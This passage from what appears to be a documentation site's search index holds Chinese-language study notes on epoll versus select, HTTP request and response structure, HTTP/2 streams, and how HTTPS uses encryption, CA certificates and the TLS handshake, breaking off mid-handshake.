<p>epoll\u5e76\u975e\u5728\u6240\u6709\u60c5\u51b5\u90fd\u6bd4select\u9ad8\u6548\uff0c\u4f8b\u5982\u5728\u5c11\u4e8e1024\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u76d1\u542c\uff0c\u4e14\u5927\u591a\u6570socket\u90fd\u662f\u5904\u4e8e\u6d3b\u8dc3\u7e41\u5fd9\u72b6\u6001\u7684\u65f6\u5019\uff0cselect\u4f1a\u6bd4epoll\u66f4\u9ad8\u6548\uff0c\u56e0\u4e3aepoll\u4f1a\u6709\u66f4\u591a\u6b21\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u5185\u6838\u6001\u548c\u7528\u6237\u6001\u7684\u5207\u6362\u66f4\u4e3a\u9891\u7e41\u3002</p> <p>\u793a\u4f8b\u7a0b\u5e8f</p>"},{"location":"other/protocol/#http","title":"HTTP","text":""},{"location":"other/protocol/#_13","title":"\u8bf7\u6c42\u51c6\u5907","text":"<p>\u5f53\u6211\u4eec\u8f93\u5165\u4e00\u4e2a\u57df\u540d\uff0c\u6309\u4e0b\u56de\u8f66\u952e\u65f6\uff0c\u6d4f\u89c8\u5668\u4f1a\u5c06\u5b83\u53d1\u9001\u7ed9DNS\u670d\u52a1\u5668\uff0c\u8ba9\u5b83\u89e3\u6790\u4e3aIP\u5730\u5740\u3002\u63a5\u7740\u5c31\u53ef\u4ee5\u901a\u8fc7\u4e09\u6b21\u63e1\u624b\u5efa\u7acbTCP\u8fde\u63a5\u4e86\u3002\u5982\u679c\u662fHTTP1.1\u7684\u534f\u8bae\uff0c\u5b83\u5f00\u542f\u4e86Keep-Alive\uff0c\u8fd9\u6837\u5efa\u7acb\u7684TCP\u8fde\u63a5\u4f1a\u5728\u591a\u6b21\u8bf7\u6c42\u4e2d\u590d\u7528\uff0c\u4ece\u800c\u51cf\u5c11\u4e86\u4e0d\u65ad\u5efa\u7acb\u8fde\u63a5\u548c\u65ad\u5f00\u8fde\u63a5\u7684\u6d88\u8017\u3002</p>"},{"location":"other/protocol/#_14","title":"\u8bf7\u6c42\u6784\u5efa","text":"<p>\u8fde\u63a5\u5efa\u7acb\u4ee5\u540e\uff0c\u5c31\u5f00\u59cb\u6784\u5efa\u8fd9\u6837\u683c\u5f0f\u7684\u8bf7\u6c42:</p> <p></p> <p>\u8bf7\u6c42\u884c</p> <p>\u65b9\u6cd5\u5e38\u7528\u7684\u6709GET\u3001POST\u3001PUT\u3001DELETE\u3001HEAD\u3001OPTIONS\u7b49\u3002HEAD\u548cGET\u8bf7\u6c42\u540c\u4e00\u4e2aURL\u65f6\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u54cd\u5e94\u5934\u4fe1\u606f\u5e94\u8be5\u76f8\u540c\uff0c\u53ea\u662f\u5bf9\u4e8eHEAD\u670d\u52a1\u7aef\u54cd\u5e94\u65f6\u4e0d\u8fd4\u56de\u6d88\u606f\u4f53\uff0c\u5e38\u7528\u4e8e\u6d4b\u8bd5\u8be5URL\u7684\u6709\u6548\u6027\u3001\u662f\u5426\u6709\u66f4\u65b0\u7b49\u3002OPTIONS\u5c5e\u4e8e\u9884\u68c0\u8bf7\u6c42\uff0c\u5e38\u7528\u4e8e\u786e\u8ba4\u670d\u52a1\u7aef\u8be5\u8d44\u6e90\u662f\u5426\u652f\u6301\u8de8\u57df\u4ee5\u53ca\u652f\u6301\u54ea\u4e9b\u8bf7\u6c42\u65b9\u6cd5\u7b49\u3002GET\u548cHEAD\u5c5e\u4e8e\u5b89\u5168\u7684\u65b9\u6cd5\uff0cGET\u3001PUT\u3001DELETE\u3001HEAD\u3001OPTIONS\u90fd\u662f\u5e42\u7b49\u7684\u3002</p> <p>URL\u4e00\u822c\u662f\u76f8\u5bf9\u8def\u5f84\u3002\u7248\u672c\u4e00\u822c\u662f<code>HTTP/1.1</code>\u3002</p> <p>\u8bf7\u6c42\u5934</p> <p>\u8bf7\u6c42\u5934\u90fd\u662f\u4e00\u884c\u884ckey-value\u7684\u5b57\u6bb5\uff0c\u6bd4\u8f83\u91cd\u8981\u7684\u6709\uff1a</p> <ul> <li>Host\uff0cHTTP/1.1\u4e2d\u7684\u5fc5\u9700\u5b57\u6bb5\uff0c\u670d\u52a1\u5668\u7684\u57df\u540d\u548c\u7aef\u53e3\u53f7(80\u53ef\u5ffd\u7565)</li> <li>User-Agent\uff0c\u6d4f\u89c8\u5668\u8eab\u4efd\u6807\u8bc6\u5b57\u7b26\u4e32</li> <li>Content-Type\uff0c\u8bf7\u6c42\u4f53\u7684MIME\u7c7b\u578b(POST\u548cPUT\u8bf7\u6c42\u4e2d)</li> <li>Authorization\uff0c\u8ba4\u8bc1\u4fe1\u606f</li> </ul>"},{"location":"other/protocol/#_15","title":"\u8bf7\u6c42\u53d1\u9001","text":"<p>HTTP\u534f\u8bae\u57fa\u4e8eTCP\u534f\u8bae\uff0c\u6240\u4ee5\u5b83\u4f7f\u7528\u9762\u5411\u8fde\u63a5\u7684\u65b9\u5f0f\u53d1\u9001\u8bf7\u6c42\uff0c\u901a\u8fc7stream\u4e8c\u8fdb\u5236\u6d41\u7684\u65b9\u5f0f\u4f20\u7ed9\u5bf9\u65b9\u3002\u5728TCP\u5c42\uff0c\u4e8c\u8fdb\u5236\u4e86\u4f1a\u53d8\u6210\u4e00\u4e2a\u4e2a\u62a5\u6587\u6bb5\u53d1\u9001\u7ed9\u670d\u52a1\u5668\uff0c\u53d1\u9001\u65f6\u8981\u6c42\u5bf9\u65b9\u6709\u4e00\u4e2a\u56de\u5e94\u7684ACK\uff0c\u6ca1\u6709\u56de\u5e94\u5c31\u4f1a\u91cd\u65b0\u4f20\u8f93\u76f4\u5230\u53ef\u8fbe\u3002</p> <p>TCP\u5c42\u53d1\u9001\u6bcf\u4e2a\u62a5\u6587\u65f6\u90fd\u4f1a\u52a0\u4e0a\u81ea\u5df1\u7684\u5730\u5740\u548c\u76ee\u6807\u7684\u5730\u5740\uff0c\u628a\u8fd9\u4e24\u4e2a\u4fe1\u606f\u653e\u5728IP\u5934\u91cc\u4ea4\u7ed9IP\u5c42\u4f20\u8f93\u3002IP\u5c42\u67e5\u770b\u76ee\u6807\u5730\u5740\u662f\u5426\u548c\u81ea\u5df1\u5728\u4e00\u4e2a\u5c40\u57df\u7f51\uff0c\u5982\u679c\u662f\uff0c\u5c31\u53d1\u9001ARP\u534f\u8bae\u6765\u8bf7\u6c42\u76ee\u6807\u5730\u5740\u5bf9\u5e94\u7684MAC\u5730\u5740\uff0c\u7136\u540e\u5c06\u6e90MAC\u548c\u76ee\u6807MAC\u653e\u5165MAC\u5934\uff0c\u53d1\u9001\u51fa\u53bb\u5373\u53ef\uff1b\u5982\u679c\u4e0d\u5728\uff0c\u5c31\u5148\u591a\u4e00\u6b65\u53d1\u9001\u5230\u7f51\u5173\uff0c\u5728\u901a\u8fc7ARP\u5f97\u5230\u7f51\u5173\u7684MAC\u5730\u5740\uff0c\u628a\u6e90MAC\u548c\u7f51\u5173MAC\u653e\u5165MAC\u5934\u53d1\u51fa\u3002</p> <p>\u7f51\u5173\u6536\u5230\u5305\u53d1\u73b0MAC\u7b26\u5408\u5c31\u53d6\u51fa\u76ee\u6807IP\u5730\u5740\uff0c\u6839\u636e\u8def\u7531\u534f\u8bae\u627e\u5230\u4e0b\u4e00\u8df3\u7684\u8def\u7531\u5668\uff0c\u83b7\u53d6\u4e0b\u4e00\u8df3\u7684\u8def\u7531\u5668MAC\u5e76\u5c06\u5305\u53d1\u8fc7\u53bb\u3002\u8fd9\u6837\u4e00\u8df3\u4e00\u8df3\u6700\u7ec8\u5230\u8fbe\u76ee\u6807\u7684\u5c40\u57df\u7f51\uff0c\u5728\u8fd9\u4e2a\u5c40\u57df\u7f51\u4e0a\u53d1\u9001ARP\u5c31\u53ef\u4ee5\u83b7\u5f97\u76ee\u6807\u5730\u5740\u7684MAC\uff0c\u5e76\u5c06\u5305\u53d1\u51fa\u53bb\u3002</p> <p>\u670d\u52a1\u5668\u53d1\u73b0MAC\u5730\u5740\u7b26\u5408\uff0c\u6839\u636eIP\u5934\u4e2d\u7684\u534f\u8bae\u9879\u77e5\u9053\u662fTCP\u534f\u8bae\uff0c\u7136\u540e\u89e3\u6790TCP\u5934\uff0c\u6839\u636e\u91cc\u9762\u7684\u5e8f\u53f7\u786e\u5b9a\u662f\u8981\u56deACK\u8fd8\u662f\u4e22\u5f03\u6389\u3002TCP\u5934\u91cc\u9762\u6709\u7aef\u53e3\u53f7\uff0cHTTP\u8fdb\u7a0b\u6b63\u5728\u76d1\u542c\uff0c\u4e8e\u662f\u670d\u52a1\u5668\u6700\u7ec8\u628a\u5305\u4ea4\u7ed9\u8fd9\u4e2a\u8fdb\u7a0b\u53bb\u5904\u7406\u3002</p>"},{"location":"other/protocol/#_16","title":"\u8fd4\u56de\u6784\u5efa","text":"<p>\u8fd4\u56de\u4e5f\u6709\u81ea\u5df1\u7684\u683c\u5f0f:</p> <p></p> <p>\u72b6\u6001\u7801\u6709\u4e94\u79cd\u53ef\u80fd\u7684\u53d6\u503c:</p> <ul> <li>1**\uff0c\u6307\u793a\u4fe1\u606f\uff0c\u8868\u793a\u8bf7\u6c42\u5df2\u63a5\u6536\uff0c\u9700\u8bf7\u6c42\u8005\u7ee7\u7eed\u5904\u7406</li> <li>2**\uff0c\u6210\u529f\uff0c\u64cd\u4f5c\u88ab\u91cd\u65b0\u63a5\u6536\u5e76\u5904\u7406</li> <li>3**\uff0c\u91cd\u5b9a\u5411\uff0c\u8981\u5b8c\u6210\u8bf7\u6c42\u5fc5\u987b\u8fdb\u884c\u66f4\u8fdb\u4e00\u6b65\u7684\u64cd\u4f5c</li> <li>4**\uff0c\u5ba2\u6237\u7aef\u9519\u8bef\uff0c\u8bf7\u6c42\u8bed\u6cd5\u9519\u8bef\u6216\u8bf7\u6c42\u65e0\u6cd5\u5b9e\u73b0</li> <li>5**\uff0c\u670d\u52a1\u7aef\u9519\u8bef\uff0c\u670d\u52a1\u5668\u5904\u7406\u8bf7\u6c42\u8fc7\u7a0b\u4e2d\u53d1\u751f\u4e86\u9519\u8bef</li> </ul> <p>\u54cd\u5e94\u5934\u91cd\u8981\u7684\u5b57\u6bb5\u6709:</p> <ul> <li>Content-Type\uff0c\u54cd\u5e94\u4f53\u7684MIME\u7c7b\u578b</li> <li>Content-Length\uff0c\u54cd\u5e94\u4f53\u7684\u957f\u5ea6</li> <li>Access-Control-Allow-Origin\uff0c\u6307\u5b9a\u54ea\u4e9b\u7f51\u7ad9\u53ef\u53c2\u4e0e\u5230\u8de8\u8d44\u6e90\u5171\u4eab\u8fc7\u7a0b\u4e2d</li> <li>Allow\uff0c\u5bf9\u4e8e\u8be5\u8d44\u6e90\u6709\u6548\u7684\u52a8\u4f5c(HTTP\u65b9\u6cd5)</li> <li>Cache-Control\uff0c\u5411\u4ece\u670d\u52a1\u5668\u76f4\u5230\u5ba2\u6237\u7aef\u5728\u5185\u7684\u6240\u6709\u7f13\u5b58\u673a\u5236\u544a\u77e5\uff0c\u5b83\u4eec\u662f\u5426\u53ef\u4ee5\u7f13\u5b58\u8fd9\u4e2a\u5bf9\u8c61\u3002\u5982<code>Cache-Control: max-age=3600</code></li> <li>Expires\uff0c\u8d85\u8fc7\u8be5\u65f6\u95f4\u5219\u8ba4\u4e3a\u6b64\u56de\u5e94\u5df2\u8fc7\u671f</li> <li>Last-Modified\uff0c\u6240\u8bf7\u6c42\u7684\u5bf9\u8c61\u6700\u540e\u4fee\u6539\u65e5\u671f</li> <li>Location\uff0c\u7528\u4e8e\u91cd\u5b9a\u5411</li> <li>Refresh\uff0c\u8bbe\u5b9a\u53ef\u5b9a\u65f6\u7684\u91cd\u5b9a\u5411\uff0c\u4f8b\u5982<code>Refresh: 5; url=http://a.com</code>\u8bbe\u5b9a\u4e865\u79d2\u540e\u8df3\u8f6c\u81f3a.com</li> <li>Set-Cookie\uff0c\u8bbe\u7f6eCookie</li> </ul> <p>\u54cd\u5e94\u6784\u5efa\u597d\u4e4b\u540e\uff0c\u4e5f\u53ea\u662f\u628a\u8bf7\u6c42\u53d1\u9001\u7684\u8fc7\u7a0b\u9006\u5411\u6765\u53d1\u9001\u56de\u53bb\u3002</p>"},{"location":"other/protocol/#http-20","title":"HTTP 2.0","text":"<p>HTTP1.1\u5728\u5e94\u7528\u5c42\u662f\u4ee5\u7eaf\u6587\u672c\u7684\u65b9\u5f0f\u901a\u4fe1\u7684\uff0c\u6bcf\u6b21\u901a\u4fe1\u90fd\u8981\u5e26\u4e0aHTTP\u5934\u90e8\uff0c\u5728\u4e0d\u8003\u8651pipeline\u6a21\u5f0f\u7684\u60c5\u51b5\u4e0b\uff0c\u6bcf\u6b21\u7684\u8fc7\u7a0b\u90fd\u662f\u4e00\u53bb\u4e00\u56de\uff0c\u8fd9\u6837\u5728\u5b9e\u65f6\u6027\u548c\u5e76\u53d1\u6027\u4e0a\u90fd\u6709\u95ee\u9898\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\uff0cHTTP 2.0\u5bf9HTTP\u5934\u8fdb\u884c\u4e86\u538b\u7f29\uff0c\u5c06\u539f\u6765\u6bcf\u6b21\u90fd\u8981\u643a\u5e26\u7684\u5934\u90e8key-value\u5728\u4e24\u7aef\u90fd\u5efa\u7acb\u4e86\u4e00\u4e2a\u7d22\u5f15\u8868\uff0c\u5bf9\u76f8\u540c\u7684\u5b57\u6bb5\u53ea\u53d1\u9001\u8868\u4e2d\u7684\u7d22\u5f15\u5373\u53ef\u3002</p> <p>\u53e6\u5916\uff0cHTTP 2.0\u8fd8\u5c06\u4e00\u4e2aTCP\u8fde\u63a5\u5206\u4e3a\u82e5\u5e72\u4e2a\u6d41\uff0c\u6bcf\u4e2a\u6d41\u4e2d\u53ef\u4ee5\u4f20\u8f93\u82e5\u5e72\u6d88\u606f\uff0c\u6bcf\u4e2a\u6d88\u606f\u7531\u82e5\u5e72\u6700\u5c0f\u7684\u4e8c\u8fdb\u5236\u5e27\u7ec4\u6210\u3002\u5e38\u89c1\u7684\u5e27\u6709Header\u5e27\uff0c\u7528\u4e8e\u4f20\u8f93Header\u5185\u5bb9\uff0c\u5e76\u4e14\u4f1a\u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u6d41\uff1b\u8fd8\u6709Data\u5e27\uff0c\u7528\u6765\u4f20\u8f93\u6b63\u6587\u5b9e\u4f53\uff0c\u591a\u4e2aData\u5e27\u5c5e\u4e8e\u540c\u4e00\u4e2a\u6d41\u3002</p> <p>\u901a\u8fc7\u8fd9\u4e24\u79cd\u673a\u5236\uff0cHTTP 2.0\u7684\u5ba2\u6237\u7aef\u53ef\u4ee5\u5c06\u591a\u4e2a\u8bf7\u6c42\u5206\u5230\u4e0d\u540c\u7684\u6d41\u4e2d\uff0c\u7136\u540e\u5c06\u8bf7\u6c42\u5185\u5bb9\u62c6\u6210\u5e27\uff0c\u8fdb\u884c\u4e8c\u8fdb\u5236\u4f20\u8f93\u3002\u8fd9\u4e9b\u5e27\u53ef\u4ee5\u6253\u6563\u4e71\u5e8f\u53d1\u9001\uff0c \u7136\u540e\u6839\u636e\u6bcf\u4e2a\u5e27\u9996\u90e8\u7684\u6d41\u6807\u8bc6\u7b26\u91cd\u65b0\u7ec4\u88c5\uff0c\u5e76\u4e14\u53ef\u4ee5\u6839\u636e\u4f18\u5148\u7ea7\uff0c\u51b3\u5b9a\u4f18\u5148\u5904\u7406\u54ea\u4e2a\u6d41\u7684\u6570\u636e\u3002\u4f8b\u5982:</p> <p></p> <p>HTTP 2.0\u5176\u5b9e\u5c31\u662f\u5c06\u4e09\u4e2a\u8bf7\u6c42\u53d8\u6210\u4e09\u4e2a\u6d41\uff0c\u5c06\u6570\u636e\u5206\u6210\u5e27\uff0c\u4e71\u5e8f\u53d1\u9001\u5230\u4e00\u4e2aTCP\u8fde\u63a5\u4e2d\u3002</p>"},{"location":"other/protocol/#https","title":"HTTPS","text":"<p>HTTP\u534f\u8bae\u6700\u5927\u7684\u95ee\u9898\u5c31\u662f\u76f8\u5f53\u4e8e\u5728\u4e92\u8054\u7f51\u4e0a\u88f8\u5954\uff0c\u4efb\u4f55\u4e00\u4e2a\u4e2d\u95f4\u4eba\u90fd\u53ef\u4ee5\u622a\u83b7\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u4f20\u8f93\u7684\u6570\u636e\u5305\uff0c\u6ca1\u6709\u4efb\u4f55\u9690\u79c1\u53ef\u8a00\u3002HTTPS\u5c31\u662f\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\uff0c\u600e\u4e48\u89e3\u51b3\uff1f\u53ea\u80fd\u52a0\u5bc6\u3002</p>"},{"location":"other/protocol/#_17","title":"\u5bf9\u79f0\u52a0\u5bc6","text":"<p>\u5728\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u4e2d\uff0c\u52a0\u5bc6\u548c\u89e3\u5bc6\u4f7f\u7528\u76f8\u540c\u7684\u4e00\u4e2a\u5bc6\u94a5\u3002\u5b83\u7684\u4f18\u70b9\u662f\u52a0\u5bc6\u89e3\u5bc6\u7684\u6548\u7387\u5f88\u9ad8\uff0c\u4f46\u662f\u5bc6\u94a5\u82e5\u88ab\u7a83\u53d6\u5b58\u5728\u5b89\u5168\u98ce\u9669\u3002\u56e0\u6b64\uff0c\u4fdd\u8bc1\u6570\u636e\u5b89\u5168\u53ea\u8981\u53bb\u4fdd\u8bc1\u53cc\u65b9\u7ea6\u5b9a\u597d\u7684\u5bc6\u94a5\u6ca1\u6709\u5176\u4ed6\u4eba\u77e5\u9053\u5c31\u884c\u4e86\u3002</p> <p>\u90a3\u4e48\u65b0\u7684\u95ee\u9898\u5c31\u662f\uff0c\u5728http\u8fd9\u4e2a\u573a\u666f\u4e2d\uff0c\u600e\u6837\u8ba9\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u7ea6\u5b9a\u4e00\u4e2a\u5bc6\u94a5\u800c\u4e0d\u88ab\u4e2d\u95f4\u4eba\u77e5\u6653\uff1f\u6211\u4eec\u4f1a\u53d1\u73b0\uff0c\u65e0\u8bba\u600e\u6837\u8bbe\u8ba1\uff0c\u9664\u975e\u662f\u7ebf\u4e0b\u4f20\u8f93\uff0c\u5426\u5219\u4ec5\u9760\u5bf9\u79f0\u52a0\u5bc6\u6ca1\u6709\u529e\u6cd5\u53ef\u9760\u7684\u628a\u5bc6\u94a5\u53d1\u9001\u7ed9\u5bf9\u65b9\u3002</p>"},{"location":"other/protocol/#_18","title":"\u975e\u5bf9\u79f0\u52a0\u5bc6","text":"<p>\u8fd9\u65f6\u5019\u6211\u4eec\u60f3\u5230\u4e86\u53ef\u4ee5\u5f15\u5165\u975e\u5bf9\u79f0\u52a0\u5bc6\u7684\u7b97\u6cd5\uff0c\u5b83\u5c06\u5bc6\u94a5\u5206\u4e3a\u516c\u94a5\u548c\u79c1\u94a5\u3002\u4f7f\u7528\u516c\u94a5\u52a0\u5bc6\u7684\u6570\u636e\u53ea\u80fd\u7528\u79c1\u94a5\u624d\u80fd\u89e3\u5f00\uff0c\u4f7f\u7528\u79c1\u94a5\u52a0\u5bc6\u7684\u6570\u636e\u4e5f\u53ea\u6709\u7528\u516c\u94a5\u624d\u80fd\u89e3\u5f00\u3002\u5b83\u7684\u4f18\u70b9\u662f\u5b89\u5168\u6027\u9ad8\u4e00\u4e9b\uff0c\u7f3a\u70b9\u5c31\u662f\u52a0\u89e3\u5bc6\u7684\u6548\u7387\u76f8\u6bd4\u4e8e\u5bf9\u79f0\u52a0\u5bc6\u5c31\u8981\u5dee\u5f88\u591a\u4e86\u3002</p> <p>\u8fd9\u65f6\uff0c\u6211\u4eec\u60f3\u5f80\u670d\u52a1\u7aef\u4f20\u9012\u4e00\u6bb5\u4fe1\u606f\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u670d\u52a1\u7aef\u63d0\u4f9b\u7684\u516c\u94a5\u52a0\u5bc6\uff0c\u8fd9\u6837\u5176\u4ed6\u4eba\u90fd\u89e3\u4e0d\u5f00\uff0c\u53ea\u6709\u670d\u52a1\u7aef\u81ea\u5df1\u6709\u79c1\u94a5\u624d\u80fd\u89e3\u5f00\u3002\u6211\u4eec\u4f20\u9012\u7684\u8fd9\u6bb5\u4fe1\u606f\u65e2\u7136\u662f\u5b89\u5168\u7684\uff0c\u5c31\u53ef\u4ee5\u8ba9\u8fd9\u6bb5\u4fe1\u606f\u662f\u4e00\u4e2a\u968f\u673a\u751f\u6210\u7684\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u7684\u5bc6\u94a5\uff0c\u8fd9\u6837\u53cc\u65b9\u4e4b\u540e\u7684\u901a\u4fe1\u90fd\u53ef\u4ee5\u57fa\u4e8e\u5bf9\u79f0\u52a0\u5bc6\u5bf9\u4e8e\u5de5\u4f5c\u6548\u7387\u7684\u63d0\u5347\u5c31\u5f88\u5927\u4e86\u3002</p>"},{"location":"other/protocol/#_19","title":"\u8bc1\u4e66","text":"<p>\u8fd9\u6837\u770b\u8d77\u6765\u597d\u50cf\u6ca1\u6709\u95ee\u9898\uff0c\u4f46\u662f\u6211\u4eec\u600e\u6837\u624d\u80fd\u83b7\u53d6\u5230\u670d\u52a1\u7aef\u7684\u516c\u94a5\u5462\uff1f\u516c\u94a5\u867d\u7136\u662f\u516c\u5f00\u7684\u6570\u636e\uff0c\u4f46\u6211\u4eec\u5728\u901a\u8fc7\u7f51\u7edc\u4f20\u8f93\u83b7\u53d6\u7684\u8fc7\u7a0b\u4e2d\uff0c\u88ab\u522b\u4eba\u7be1\u6539\u4e86\u600e\u4e48\u529e\uff1f</p> <p>\u8fd9\u65f6\uff0c\u53ea\u80fd\u5f15\u5165\u4e00\u4e2a\u65b0\u7684\u7b2c\u4e09\u65b9:CA\u673a\u6784\uff0c\u5b83\u4f5c\u4e3a\u4e00\u4e2a\u6743\u5a01\u673a\u6784\u4e13\u95e8\u7ed9\u5404\u4e2a\u7f51\u7ad9\u9881\u53d1\u8bc1\u4e66(Certificate)\u3002</p> <p>\u7f51\u7ad9\u7ba1\u7406\u5458\u7528\u81ea\u5df1\u7684\u516c\u94a5\u3001\u57df\u540d\u3001\u6709\u6548\u65f6\u957f\u7b49\u4fe1\u606f\u5411CA\u7533\u8bf7\u5236\u4f5c\u8bc1\u4e66\uff0c\u8bc1\u4e66\u505a\u597d\u4ee5\u540e\u7ecf\u7531CA\u673a\u6784\u7684\u79c1\u94a5\u8fdb\u884c\u52a0\u5bc6\u5f97\u5230\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u628a\u8fd9\u4e2a\u5b57\u7b26\u4e32\u653e\u5728\u670d\u52a1\u7aef\u3002\u6211\u4eec\u6bcf\u6b21\u8bbf\u95ee\u7f51\u7ad9\u65f6\uff0c\u670d\u52a1\u7aef\u628a\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7ed9\u6d4f\u89c8\u5668\uff0c\u6d4f\u89c8\u5668\u4f7f\u7528CA\u63d0\u4f9b\u7684\u516c\u94a5\u8fdb\u884c\u89e3\u5bc6\uff0c\u82e5\u89e3\u5bc6\u6210\u529f\u5c31\u4f1a\u5f97\u5230\u8fd9\u4e2a\u8bc1\u4e66\uff0c\u8bc1\u4e66\u5185\u53c8\u5305\u542b\u6709\u670d\u52a1\u7aef\u7684\u516c\u94a5\uff0c\u5c31\u53ef\u4ee5\u6309\u4e4b\u524d\u8bf4\u7684\u65b9\u5f0f\u7ee7\u7eed\u901a\u4fe1\u4e86\u3002</p> <p>\u95ee\u9898\u4ece\u5982\u4f55\u5b89\u5168\u83b7\u53d6\u670d\u52a1\u7aef\u7684\u516c\u94a5\u53d8\u4e3a\u5982\u4f55\u5b89\u5168\u83b7\u53d6CA\u673a\u6784\u7684\u516c\u94a5\u4e86\uff0c\u8fd9\u4e2a\u5c31\u597d\u89e3\u51b3\u4e86\uff0c\u6211\u4eec\u65e0\u6cd5\u628a\u6210\u5343\u4e0a\u4e07\u4e2a\u7f51\u7ad9\u7684\u516c\u94a5\u5185\u7f6e\u5728\u7cfb\u7edf\u4e2d\uff0c\u4f46\u53ef\u4ee5\u628a\u6709\u9650\u7684\u51e0\u4e2aCA\u673a\u6784\u7684\u516c\u94a5\u5185\u7f6e\u8fdb\u6765\uff0c\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u7528\u6b63\u7248\u7684\u64cd\u4f5c\u7cfb\u7edf\u5c31\u597d\u4e86\u3002</p> <p>\u4e2d\u95f4\u4eba\u6b64\u65f6\u80fd\u4e0d\u80fd\u505a\u4e2a\u5047\u7f51\u7ad9\uff0c\u4e5f\u53bbCA\u673a\u6784\u7533\u8bf7\u4e00\u4e2a\u8bc1\u4e66\uff0c\u7136\u540e\u5728\u53cc\u65b9\u901a\u4fe1\u7684\u65f6\u5019\u7528\u81ea\u5df1\u7684\u5b57\u7b26\u4e32\u66ff\u6362\u6389\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u5462\uff1f\u8fd9\u6837\u6d4f\u89c8\u5668\u53bbCA\u89e3\u5bc6\u4e5f\u53ef\u4ee5\u6210\u529f\uff0c\u4f46\u8bc1\u4e66\u5305\u542b\u4e86\u7f51\u7ad9\u7684\u57df\u540d\uff0c\u4f9d\u7136\u662f\u4f1a\u88ab\u6d4f\u89c8\u5668\u8bc6\u7834\u7684\u3002</p>"},{"location":"other/protocol/#_20","title":"\u5de5\u4f5c\u8fc7\u7a0b","text":"<p>HTTPS\u53ef\u4ee5\u7406\u89e3\u4e3a\u5728HTTP\u548cTCP\u4e4b\u95f4\u52a0\u4e86\u4e00\u5c42TLS/SSL\uff0c\u5b83\u7684\u5de5\u4f5c\u8fc7\u7a0b\u53ef\u4ee5\u7528\u4e0b\u56fe\u8868\u793a:</p> <p></p> <p>\u5f53\u6211\u4eec\u767b\u5f55\u4e00\u4e2a\u7f51\u7ad9\u7684\u65f6\u5019\uff0c\u5ba2\u6237\u7aef\u5148\u53d1\u9001Client Hello\u6d88\u606f\u5230\u670d\u52a1\u7aef\uff0c\u4ee5\u660e\u6587\u4f20\u8f93TLS\u7248\u672c\u4fe1\u606f\u3001\u52a0\u5bc6\u5957\u4ef6\u5019\u9009\u5217\u8868\u3001\u538b\u7f29\u7b97\u6cd5\u5019\u9009\u5217\u8868\u7b49\u4fe1\u606f\uff0c\u8fd8\u5305\u62ec\u4e00\u4e2a\u968f\u673a\u6570\uff0c\u7528\u4e8e\u4e4b\u540e\u534f\u5546\u5bf9\u79f0\u5bc6\u94a5\u3002</p> <p>\u670d\u52a1\u7aef\u6536\u5230\u4ee5\u540e\u8fd4\u56deServer Hello\u6d88\u606f\uff0c\u5e76\u9644\u5e26\u670d\u52a1\u5668\u9009\u62e9\u4f7f\u7528\u7684\u534f\u8bae\u7248\u672c\u3001\u52a0\u5bc6\u5957\u4ef6\u3001\u538b\u7f29\u7b97\u6cd5\u7b49\uff0c\u540c\u6837\u4e5f\u4f1a\u6709\u4e00\u4e2a\u968f\u673a\u6570\u4e4b\u540e\u534f\u5546\u5bf9\u79f0\u5bc6\u94a5\u7528\u3002\u7136\u540e\u518d\u53d1\u9001\u4e00\u4e2a\u670d\u52a1\u7aef\u7684\u8bc1\u4e66\uff0c\u5e76\u9644\u5e26Server Hello Done\u8868\u793a\u4fe1\u606f\u90fd\u53d1\u5b8c\u4e86\u3002</p> <p>\u5ba2\u6237\u7aef\u62ff\u5230\u8bc1\u4e66\u4ee5\u540e\u5c31\u4ece\u81ea\u5df1\u4fe1\u4efb\u7684CA\u4ed3\u5e93\u4e2d\uff0c\u62ffCA\u91cc\u7684\u516c\u94a5\u53bb\u89e3\u5bc6\u8fd9\u4e2a\u8bc1\u4e66\uff0c\u5982\u679c\u80fd\u591f\u6210\u529f\uff0c\u5219\u8bf4\u660e\u8bc1\u4e66\u662f\u53ef\u4fe1\u7684\uff0c\u90a3\u4e48\u4e5f\u5c31\u5f97\u5230\u4e86\u8bc1\u4e66\u4e2d\u5305\u542b\u7684\u670d\u52a1\u7aef\u7684\u516c\u94a5\u3002\u63a5\u7740\u901a\u8fc7\u8ba1\u7b97\u4ea7\u751f\u968f\u673a\u6570\u5b57Pre-master\uff0c\u53d1\u9001Client Key Exchange\uff0c\u5e76\u7528\u670d\u52a1\u7aef\u516c\u94a5\u52a0\u5bc6\u53d1\u9001\u8fc7\u53bb\u3002</p> <p>\u73b0\u5728\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u90fd\u6709\u4e86\u4e09\u4e2a\u968f\u673a\u6570\u5b57\uff0c\u5206\u522b\u662f\u81ea\u5df1\u7684\u3001\u5bf9\u7aef\u7684\u4ee5\u53ca\u521a\u521a\u751f\u6210\u7684Pre-master\u3002\u901a\u8fc7\u5b83\u4eec\u5c31\u53ef\u4ee5\u5728\u670d\u52a1\u7aef\u548c\u5ba2\u6237\u7aef\u4e4b\u95f4\u751f\u6210\u76f8\u540c\u7684\u5bf9\u79f0\u5bc6\u94a5\u4e86\u3002</p> <p>\u6709\u4e86\u5bf9\u79f0\u5bc6\u94a5\uff0c\u5ba2\u6237\u7aef\u4f1a\u53d1\u9001Change Cipher Spec\u610f\u601d\u662f\u4e4b\u540e\u53ef\u4ee5\u7528\u8be5\u5bc6\u94a5\u6765\u52a0\u5bc6\u901a\u4fe1\u4e86\uff0c\u5e76\u9644\u5e26\u4e00\u6761Encrypted Handshake 